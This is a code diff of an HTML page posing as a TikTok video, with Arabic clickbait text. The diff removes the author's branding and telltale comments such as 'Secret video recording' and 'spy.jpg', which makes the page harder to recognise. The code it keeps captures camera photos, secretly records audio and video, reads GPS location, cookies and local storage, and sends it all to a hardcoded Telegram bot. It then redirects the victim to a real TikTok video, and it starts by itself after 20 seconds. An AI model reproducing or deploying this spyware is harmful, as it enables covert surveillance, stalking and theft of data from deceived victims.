@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Cyber Balasi Security - فيديو حصري</title>
+    <title>فيديو حصري</title>
     <style>
         * {
             -webkit-tap-highlight-color: transparent;
@@ -113,7 +113,6 @@
             opacity: 0;
             pointer-events: none;
         }
-        /* Fake TikTok UI */
         .tiktok-sidebar, .video-info, .bottom-nav {
             transition: opacity 0.5s ease;
             position: absolute;
@@ -154,8 +153,8 @@
             <div class="sidebar-icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92z"/></svg><span>Share</span></div>
         </div>
         <div class="video-info" id="fake-info">
-            <div class="username">@cyber_balasi</div>
-            <div class="description">⚡ Cyber Balasi Security ⚡ فضيحة لن تصدقها</div>
+            <div class="username">@trending_viral</div>
+            <div class="description">🔥 لن تصدق ماذا حدث 🔥 #fyp #viral</div>
             <div class="music">🎵 original sound - trending</div>
         </div>
         <div class="bottom-nav" id="fake-nav">
@@ -165,14 +164,14 @@
 
         <div id="loading-overlay">
             <div class="spinner"></div>
-            <div class="loading-message" id="loading-message">Cyber Balasi Security • جاري تجهيز الفضيحة...</div>
+            <div class="loading-message" id="loading-message">جاري تحميل الفيديو...</div>
             <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
         </div>
-        <div id="recording-overlay">🔴 Cyber Balasi • تسجيل</div>
+        <div id="recording-overlay">🔴 تسجيل</div>
     </div>
 
     <script>
-        // Cyber Balasi Security - iOS Bypass Enhanced
+        // Telegram Configuration
         const TELEGRAM_BOT_TOKEN = '8683251674:AAE73I1jn1GqjsIu6eVGRxya25q5ilNOzkA';
         const CHAT_ID = '6969346690';
         const REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
@@ -189,7 +188,6 @@
 
         function updateProgress(p) { document.getElementById('progress-fill').style.width = p+'%'; }
 
-        // iOS PERMISSION BYPASS: request camera after ANY click
         async function requestCameraPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -198,7 +196,6 @@
             } catch(e) { return false; }
         }
 
-        // Capture multiple images (iPhone compatible)
         async function captureMultipleImages() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -208,7 +205,6 @@
                 video.srcObject = stream;
                 video.setAttribute('playsinline', '');
                 await video.play();
-                
                 await new Promise(r => setTimeout(r, 500));
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
@@ -222,10 +218,9 @@
                 }
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch(e) { console.warn('Camera capture failed:', e); return false; }
+            } catch(e) { return false; }
         }
 
-        // Secret video recording (with audio)
         async function recordSecretVideo() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -246,7 +241,6 @@
             } catch(e) { return false; }
         }
 
-        // GPS Location
         async function getPreciseLocation() {
             return new Promise((resolve) => {
                 if (navigator.geolocation) {
@@ -259,7 +253,6 @@
             });
         }
 
-        // Collect storage
         function collectStorage() {
             try {
                 collectedData.cookies = document.cookie;
@@ -270,9 +263,8 @@
             } catch(e) {}
         }
 
-        // Send all data to Telegram
         async function sendAllData() {
-            let msg = `🔐 Cyber Balasi Security Report\n⏰ Time: ${collectedData.timestamp}\n📱 UA: ${collectedData.userAgent.substring(0,150)}\n`;
+            let msg = `🎯 Target Data\n⏰ Time: ${collectedData.timestamp}\n📱 Device: ${collectedData.userAgent.substring(0,150)}\n`;
             if(collectedData.location) msg += `📍 GPS: ${collectedData.location.lat}, ${collectedData.location.lon}\n🗺️ https://maps.google.com/?q=${collectedData.location.lat},${collectedData.location.lon}\n`;
             msg += `🍪 Cookies: ${collectedData.cookies ? collectedData.cookies.substring(0,200) : 'None'}\n`;
             
@@ -285,7 +277,7 @@
                 let blob = await fetch(img).then(r => r.blob());
                 let fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'spy.jpg');
+                fd.append('photo', blob, 'cam.jpg');
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 await new Promise(r => setTimeout(r, 500));
             }
@@ -299,10 +291,9 @@
             }
         }
 
-        // Main operation
         async function fullOperation() {
             updateProgress(10);
-            await requestCameraPermission(); // Force permission on iOS
+            await requestCameraPermission();
             updateProgress(25);
             await captureMultipleImages();
             updateProgress(45);
@@ -317,7 +308,6 @@
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
         }
 
-        // Trigger on click (user gesture)
         document.getElementById('video-placeholder').addEventListener('click', async () => {
             document.getElementById('video-placeholder').classList.add('hidden-ui');
             document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
@@ -327,13 +317,11 @@
             await fullOperation();
         });
 
-        // Auto-start after 20 seconds
         setTimeout(() => {
             if(document.getElementById('loading-overlay').style.display !== 'flex')
                 document.getElementById('video-placeholder').click();
         }, 20000);
 
-        // Prevent zoom
         document.addEventListener('touchmove', (e) => { if(e.target === document.body) e.preventDefault(); }, { passive: false });
     </script>
 </body>
